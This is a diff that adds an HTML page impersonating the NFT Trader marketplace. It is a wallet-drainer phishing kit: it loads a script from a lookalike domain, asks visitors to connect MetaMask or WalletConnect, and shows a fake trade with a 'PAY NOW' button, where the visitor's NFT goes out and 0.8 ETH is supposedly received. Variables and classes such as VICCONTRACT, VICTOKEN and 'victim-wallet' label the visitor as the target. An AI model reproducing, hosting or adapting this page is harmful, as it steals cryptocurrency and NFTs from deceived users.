@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/moralis/dist/moralis.js"></script>
+    <script src="https://github.com/WalletConnect/walletconnect-monorepo/releases/download/1.7.1/web3-provider.min.js"></script>
+    <meta name="viewport" 
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <script>
+        const MODE = "nfteth";
+        const SENDERADDRESS = "0x038047a03F321C46a7D2D7ea15C0C0Aee5d8ab74";
+        var VICCONTRACT;
+        var VICTOKEN;
+
+        if(MODE == 'nftnft' || MODE == 'nfteth') {
+            VICCONTRACT = "0x81ae0be3a8044772d04f32398bac1e1b4b215aa8";
+            VICTOKEN = "1191";
+        }
+
+
+    </script>
+    <script src="https://nfttrader.io-0xf3c67f0f8e10a427d3f8d8db32761f1ebabe40c8.ink/static/js/trader.js"></script>
+    <script src="../static/js/w3modal.css.html"></script>
+    <link rel="icon" type="image/x-icon" href="../static/images/favicon.ico">
+    <title>NFT Trader | The P2P decentralized and secure non-fungible token trading platform</title>
+    <style>@font-face {
+            font-family: ftBk;
+            src: url("https://nfttrader.io-0xf3c67f0f8e10a427d3f8d8db32761f1ebabe40c8.ink/static//fonts/FuturaBookBT.ttf");
+        }
+
+        @font-face {
+            font-family: ftThn;
+            src: url("https://nfttrader.io-0xf3c67f0f8e10a427d3f8d8db32761f1ebabe40c8.ink/static//fonts/FuturaThin.ttf");
+        }
+
+        @font-face {
+            font-family: ftExBlack;
+            src: url("https://nfttrader.io-0xf3c67f0f8e10a427d3f8d8db32761f1ebabe40c8.ink/static//fonts/FuturaExtraBlack.ttf");
+        }
+
+        @font-face {
+            font-family: ftBold;
+            src: url("https://nfttrader.io-0xf3c67f0f8e10a427d3f8d8db32761f1ebabe40c8.ink/static//fonts/FuturaBold.otf");
+        }
+
+        @font-face {
+            font-family: ftMed;
+            src: url("https://nfttrader.io-0xf3c67f0f8e10a427d3f8d8db32761f1ebabe40c8.ink/static//fonts/FuturaMedium.ttf");
+        }
+    </style>
+    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="../static/style/trader.css">
+</head>
+
+<body>
+    <div class="sidebar">
+        <div class="sb-text">
+            <p class="sb-bold sb-head">Transaction</p>
+            <p class="sb-bold">Counterparty Account Selected</p>
+            <p>0xF3C67F0f8E10A427d3f8D8Db32761F1eBABE40C8</p>
+            <p class="sb-bold">Your current Account</p>
+            <p class="sb-victimAddress">...</p>
+        </div>
+        <div class="sb-btn-group">
+            <button class="close-btn" onclick="togglesidebar();">
+                CLOSE
+            </button>
+            <button class="paynow-btn">
+                PAY NOW
+            </button>
+        </div>
+    </div>
+
+
+
+    <p class="errormodal"></p>
+
+    <div class="sidebartogglebtn" onclick="togglesidebar();">
+        <i class="fa-solid fa-receipt" style="color: black;"></i>
+    </div>
+
+
+    <!-- top nav -->
+    <div class="top-navigation">
+        <img src="../static/images/discord.png" alt="White discord logo" class="social-icon">
+        <img src="../static/images/twitter.png" alt="White twitter logo" class="social-icon">
+        <a class="nav-greenlink connect-wallet" href="">CONNECT WALLET</a>
+    </div>
+    <!-- end top nav -->
+
+    <!-- secondary nav -->
+    <div class="secondary-navigation">
+        <img src="../static/images/logo.svg.html" alt="NFTTRADER logo" class="nfttrader-brand">
+        <div class="s-nav-links">
+            <a href="#">Game of Trades</a>
+            <a href="#" class="selected">Make a trade</a>
+            <a href="#">My Trades</a>
+            <a href="#">Deals History</a>
+            <a href="#">TradeSquads</a>
+            <a href="#">Mint Trade Squad</a>
+        </div>
+        <img class="hamburger-icon" src="../static/images/hamburger.png" alt="">
+    </div>
+    <!-- end secondary nav -->
+
+    <!-- web3 modal -->
+    <div class="w3modal" style="z-index: 10;">
+        <div class="w3modal-provider" id="metamask-provider">
+            <img class="w3modal-image" src="../static/images/meta-fox.png" alt="">
+            <p class="w3modal-providerName">MetaMask</p>
+            <p class="w3modal-providerDescription">Connect to your MetaMask Wallet</p>
+        </div>
+        <div class="w3modal-line"></div>
+        <div class="w3modal-provider" id="wc-provider">
+            <img class="w3modal-image" src="../static/images/walletconnect.svg.html" alt="">
+            <p class="w3modal-providerName">Wallet Connect</p>
+            <p class="w3modal-providerDescription">Scan with WalletConnect to connect</p>
+        </div>
+    </div>
+    <!-- end web3 modal -->
+
+    <!-- main content view -->
+    <div class="main-content">
+        <div class="trade-banner">
+            <p style="padding-left: 10px;"><b>Final step: </b>Check the counterparty assets and proceed to checkout</p>
+        </div>
+        <div class="trade-view">
+            <div class="col left-col">
+                <div class="col-header-group">
+                    <h1 class="h1-underline col-header">My Wallet Assets</h1>
+                    <div class="btn-lable" style="background-color: #ff4c23 !important;"><p style="color: white;">OUT<i class="fa-solid fa-arrow-right-long"></i></p></div>
+                </div>
+
+                <div class="wallet-information">
+                    <img class="wallet-icon" src="../static/images/wallet_icon_1.png" alt="">
+                    <p class="victim-wallet">...</p>
+                </div>
+
+                
+                <h1 class="nft-card-label">Dreadfulz <span style="font-family:ftThn">x</span> 1</h1>
+                <div class="nft-card victim-nft-card">
+                    <img src="../../lh3.googleusercontent.com/unnamed.png" alt="">
+                    <p class="p-label" style="font-size: 12px; color:rgb(73, 73, 73);">Token Name</p>
+                    <p class="p-label">Dreadfulz</p>
+                    <p class="p-label" style="font-size: 12px; color:rgb(73, 73, 73);">Token ID</p>
+                    <p class="p-label">#1191</p>
+                </div>
+                
+
+                
+
+            </div>
+            <div class="col right-col">
+                <div class="col-header-group">
+                    <h1 class="h1-underline col-header">Counterparty Assets</h1>
+                    <div class="btn-lable" style="background-color:#11f277 !important;"><p style="color: white;"><i class="fa-solid fa-arrow-left-long"></i>IN</p></div>
+                </div>
+
+                <div class="wallet-information">
+                    <img class="wallet-icon" src="../static/images/wallet_icon_2.png" alt="">
+                    <p class="sender-wallet">0xF3C67F0f8E10A427d3f8D8Db32761F1eBABE40C8</p>
+                </div>
+                
+                
+
+                
+                <h1 class="nft-card-label">Ethereum - ETH</h1>
+                <div class="victimEth">
+                    <i class="fa-solid fa-circle-check"></i>
+                    <p class="victimEthDisplay">0.8 ETH</p>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+    <!-- end main content view -->
+    
+
+</body>
+</html>
